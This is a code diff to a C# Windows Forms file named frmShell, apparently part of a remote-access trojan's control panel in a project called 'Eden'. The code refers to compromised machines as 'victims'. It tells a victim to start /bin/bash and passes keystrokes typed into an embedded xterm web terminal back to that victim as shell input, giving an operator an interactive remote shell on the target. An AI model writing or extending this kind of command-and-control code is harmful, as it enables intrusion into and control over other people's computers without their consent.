@@ -12,8 +12,8 @@ namespace Eden
 {
     public partial class frmShell : Form
     {
-        private clsVictim m_victim;
-        public string m_szVictimID;
+        private clsVictim m_victim { get; init; }
+        private string m_szVictimID { get { return m_victim.m_szID; } }
 
         private enum HistoryCmd
         {
@@ -28,19 +28,22 @@ namespace Eden
             m_victim = victim;
         }
 
-        private void fnReceived(clsClient m_clnt, string szVictimID, string[] aszMsg)
+        private void fnReceived(clsClient m_clnt, string szVictimID, string[] asMsg)
         {
+            if (!string.Equals(szVictimID, m_szVictimID))
+                return;
+
             try
             {
-                if (!string.Equals(szVictimID, m_szVictimID))
-                    return;
-
-                if (aszMsg[0] == "shell")
+                if (asMsg[0] == "shell")
                 {
-                    Invoke(new Action(() =>
+                    if (asMsg[1] == "output")
                     {
-                        
-                    }));
+                        Invoke(() =>
+                        {
+                            webView21.CoreWebView2.PostWebMessageAsString(asMsg[2]);
+                        });
+                    }
                 }
             }
             catch (Exception ex)
@@ -51,35 +54,59 @@ namespace Eden
 
         private void fnInitCmd()
         {
-            
-        }
-
-        private void fnSendCmdCommand(string szCmd)
-        {
-
-        }
-
-        private void fnHistoryCmd(HistoryCmd history)
-        {
-            switch (history)
+            m_victim.fnSendCommand(new string[]
             {
-                case HistoryCmd.Previous:
-
-                    break;
-                case HistoryCmd.Next:
-
-                    break;
-            }
+                "Shell",
+                "init",
+                "/bin/bash",
+                ".",
+            });
         }
 
-        void fnSetup()
+        async void fnSetup()
         {
+            string szXtermPath = Path.Combine(Application.StartupPath, "Tools", "xterm", "terminal.html");
+            if (!File.Exists(szXtermPath))
+            {
+                MessageBox.Show(
+                    $"Cannot find xterm file: {szXtermPath}\n" +
+                    $"This form will be existed.",
+                    "File not found",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Error
+                );
+
+                Close();
+
+                return; //Ensure do not run the code below.
+            }
+
             //Controls
+            m_victim.m_clnt.ServerMessageReceived += fnReceived;
+
             StartPosition = FormStartPosition.CenterScreen;
 
+            textBox1.Font = new Font("Cascadia Mono", 10.5f);
+            textBox1.ForeColor = Color.White;
             textBox1.Text = "/bin/bash";
 
-            m_victim.m_clnt.ServerMessageReceived += fnReceived;
+            //Webview
+            await webView21.EnsureCoreWebView2Async();
+            webView21.CoreWebView2.Navigate(szXtermPath);
+            webView21.CoreWebView2.WebMessageReceived += (s, e) =>
+            {
+                string szMsg = e.TryGetWebMessageAsString();
+                if (szMsg.StartsWith("xterm|input"))
+                {
+                    string szInput = szMsg.Substring("xterm|input|".Length);
+                    m_victim.fnSendCommand(new string[]
+                    {
+                        "Shell",
+                        "input",
+                        szInput,
+                    });
+                }
+            };
 
             fnInitCmd();
         }
@@ -95,6 +122,11 @@ namespace Eden
             {
                 fnInitCmd();
             }
+        }
+
+        private void frmShell_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            m_victim.m_clnt.ServerMessageReceived -= fnReceived;
         }
     }
 }
